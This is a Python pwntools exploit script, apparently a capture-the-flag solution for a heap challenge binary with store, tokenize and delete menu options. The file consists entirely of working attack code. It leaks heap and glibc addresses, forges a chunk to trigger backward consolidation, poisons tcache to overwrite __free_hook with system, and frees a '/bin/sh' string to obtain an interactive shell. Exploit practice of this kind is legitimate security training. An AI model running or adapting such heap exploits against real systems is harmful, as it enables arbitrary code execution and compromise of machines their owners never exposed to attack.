#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64

context.binary = 'chall'
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def do_str(size: int, string: bytes) -> int:
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size? ', str(size).encode())
    io.sendafter(b'str? ', string)
    io.recvuntil(b'stored at ')
    return int(io.recvuntil(b'!', drop=True).decode())


def do_tok(index: int, separator: bytes) -> list[bytes]:
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx? ', str(index).encode())
    io.sendlineafter(b'delim? ', separator)
    return io.recvuntil(b'\n1. str', drop=True).splitlines()


def do_del(index: int):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx? ', str(index).encode())


def main():
    for _ in range(9):
        do_str(0xf8, b'A')

    for i in range(9):
        do_del(8 - i)

    for _ in range(9):
        do_str(0xf8, b'A')

    heap_addr = u64(do_tok(0, b'.')[0].ljust(8, b'\0')) & (~0xfff)
    glibc.address = u64(do_tok(7, b'.')[0].ljust(8, b'\0')) - 0x3ebe41
    io.info(f'Heap base address: {hex(heap_addr)}')
    io.success(f'Glibc base address: {hex(glibc.address)}')

    do_str(0xf8, b'a' * 0xf8)
    do_str(0xf8, b'b')
    do_str(0xf8, b'x')

    for i in range(6):
        do_del(5 - i)

    do_tok(9, b'\x01')
    do_del(9)

    do_del(
        do_str(
            0xf8,
            p64(0) * 2 +
            p64(0) + p64(0xe0) +
            p64(heap_addr + 0xb80) * 2 +
            p64(heap_addr + 0xb70) * 2 +
            b'c' * 0xb0 + p64(0xe0)
        )
    )

    do_del(10)

    i = do_str(0x18, b'Q')
    do_del(do_str(0x18, b'x'))
    do_del(i)

    do_str(0xf8, b'X' * 0x18 + p64(0x21) + p64(glibc.sym.__free_hook))
    s = do_str(0x18, b'/bin/sh')
    do_str(0x18, p64(glibc.sym.system))
    do_del(s)

    io.interactive()


if __name__ == '__main__':
    io = get_process()
    main()
